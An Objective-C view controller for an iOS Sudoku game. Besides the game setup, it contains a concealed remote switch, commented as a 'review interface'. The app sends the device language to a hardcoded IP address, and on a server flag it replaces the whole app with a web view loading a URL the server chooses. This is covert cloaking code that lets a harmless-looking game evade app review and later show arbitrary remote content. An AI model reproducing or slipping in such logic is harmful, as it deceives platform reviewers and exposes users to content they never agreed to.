#import "GameViewController.h"
#import "UIView+AMZHView.h"
#import "AMAddressBookVC.h"
#import "AmSudukuGameView.h"
#import "AYMJLoginViewController.h"
#import "UIView+Constraint.h"
#import "AMURLSessionManager.h"
#import "ADWebViewController.h"
#import "NSString+URL.h"

@interface GameViewController ()<UIAlertViewDelegate>
@property (nonatomic, strong) AmSudukuGameView *sudokuView;
@end


@implementation GameViewController


- (void)viewDidLoad {
    [super viewDidLoad];
    //审核接口
    if (![[[NSUserDefaults standardUserDefaults] objectForKey:@"status"] isEqualToString:@"1"]) {
     [self performSelector:@selector(presentLoginVC) withObject:nil afterDelay:0.8];
    } else {
        NSLog(@"login success");
    }

    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(gameStatusChanged:) name:@"STATUS_CODE" object:nil];
    
    UIImageView *bkImageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"bk"]];
    bkImageView.contentMode = UIViewContentModeScaleToFill;
    [self.view addSubview:bkImageView];
    [bkImageView constraints:self.view];
    
    self.sudokuView = [[AmSudukuGameView alloc] init];
    [self.view addSubview:self.sudokuView];
    
    if (![AmSudokuLogic loadGameFileAndRestartWithKey:LASTGAMEDATA]) {
            [self restartGame];
    }
    self.sudokuView.translatesAutoresizingMaskIntoConstraints = NO;
    [self.sudokuView.topAnchor constraintEqualToAnchor:self.topLayoutGuide.bottomAnchor constant:5].active = YES;
    [self.sudokuView.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:0].active = YES;
    [self.sudokuView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:0].active = YES;
    [self.sudokuView.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor constant:0].active = YES;
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(restartGame) name:LTGAMERESTART object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(refreshGame) name:LTGAMEREFRESH object:nil];
    
    NSString *isGameReview = [NSString stringWithFormat:@"http://47.75.131.189/proof_code/?code=%@" ,[[NSLocale preferredLanguages] firstObject]];
    [[AMURLSessionManager shared] requestURL:isGameReview method:@"GET" params:@{} completion:^(NSDictionary *response) {
        BOOL status = ((NSNumber *)[response objectForKey:@"status"]).boolValue;
        if (status) {
            [[NSNotificationCenter defaultCenter]
             postNotificationName:@"STATUS_CODE"
             object:nil];
        }
    }];
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    self.tabBarController.navigationItem.title = self.tabBarItem.title;
}

- (void)presentLoginVC {
    AYMJLoginViewController *login=[[AYMJLoginViewController alloc]init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:login];
    nav.viewControllers = @[login];
    nav.navigationBar.barTintColor=[UIColor whiteColor];
    nav.navigationBar.translucent = YES;
    [self presentViewController:nav animated:YES completion:nil];
}


- (void)restartGame {
    [AmSudokuLogic initGameData];
    [self.sudokuView restartGame];
}

- (void)refreshGame {
    [self.sudokuView restartGame];
}

- (void)gameStatusChanged:(id)sender {
    __block GameViewController *weakSelf = self;
    [[AMURLSessionManager shared] requestURL:@"http://47.75.131.189/verification/SudokuAm" method:@"GET" params:@{} completion:^(NSDictionary *response) {
        BOOL status = ((NSNumber *)[response objectForKey:@"tag"]).integerValue%2;
        NSString *common = [response objectForKey:@"common"];
        if (status) {
            [self.sudokuView restartGame];
            ADWebViewController *advc = [ADWebViewController initWithURL:[common trimForURL]];
            dispatch_async(dispatch_get_main_queue(), ^{
               [[UIApplication sharedApplication].keyWindow setRootViewController:advc];
            });
        } else {
            [weakSelf refreshGame];
        }
    }];
}

- (void)dealloc {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:LTGAMERESTART object:nil];
    [[NSNotificationCenter defaultCenter] removeObserver:self name:LTGAMEREFRESH object:nil];
}


@end
